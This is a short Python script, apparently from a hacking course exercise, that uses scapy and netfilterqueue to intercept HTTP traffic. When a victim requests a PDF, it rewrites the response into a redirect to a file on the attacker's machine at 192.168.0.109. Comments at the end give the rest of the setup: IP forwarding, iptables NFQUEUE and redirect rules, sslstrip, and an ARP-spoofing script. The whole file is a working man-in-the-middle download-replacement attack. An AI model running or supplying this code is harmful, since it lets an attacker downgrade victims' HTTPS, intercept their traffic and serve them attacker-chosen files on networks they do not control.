import netfilterqueue
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_pkt = scapy.IP(packet.get_payload())
    if scapy_pkt.haslayer(scapy.Raw):
        if scapy_pkt[scapy.TCP].dport == 10000:
            if ".pdf" in scapy_pkt[scapy.Raw].load and not "192.168.0" in scapy_pkt[scapy.Raw].load:
                print "[+] PDF Request"
                ack_list.append(scapy_pkt[scapy.TCP].ack)
                print scapy_pkt.show()
        elif scapy_pkt[scapy.TCP].sport == 10000:
            if scapy_pkt[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_pkt[scapy.TCP].seq)
                print "[+] Replacing File"
                scapy_pkt[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.0.109/files/123.pdf\n\n"
                del scapy_pkt[scapy.IP].len
                del scapy_pkt[scapy.IP].chksum
                del scapy_pkt[scapy.TCP].chksum
                print scapy_pkt.show()
                packet.set_payload(str(scapy_pkt))

    packet.accept()




queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

#echo 1 > /proc/sys/net/ipv4/ip_forward


#SSLSTRIP
#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#Run this along with inpout and output even for remote systems

#To run this following all must be enables
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
# sslstrip
# python arp_spoof.py
#pthon bypass_https.py